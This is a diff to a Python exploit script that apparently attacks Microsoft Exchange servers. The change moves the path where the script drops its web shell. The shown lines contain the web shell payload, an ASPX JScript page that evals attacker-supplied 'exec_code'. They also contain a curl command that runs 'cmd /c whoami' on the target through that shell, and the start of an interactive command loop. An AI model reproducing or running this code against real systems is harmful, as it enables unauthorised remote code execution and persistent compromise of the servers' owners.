@@ -23,7 +23,7 @@ shell_name = "shell.aspx"
 random_name = id_generator(3) + ".js"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
 
-shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % shell_name
+shell_path = "inetpub\\wwwroot\\aspnet_client\\%s" % shell_name
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
 shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
 
@@ -194,8 +194,8 @@ if ct.status_code != 200:
 time.sleep(2)
 req_test = requests.get('https://%s/aspnet_client/%s'%(target, shell_name), verify=False)
 if "OAB (Default Web Site)" in req_test.text:
-  print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
-  print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
+  print('(+) Webshell drop at https://%s/aspnet_client/%s .. Have fun!'%(target, shell_name))
+  print('(+) Code: curl -ik https://%s/aspnet_client/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
   print('(+) Starting semi-interactive')
   while True:
     cmd = input('CMD # ')
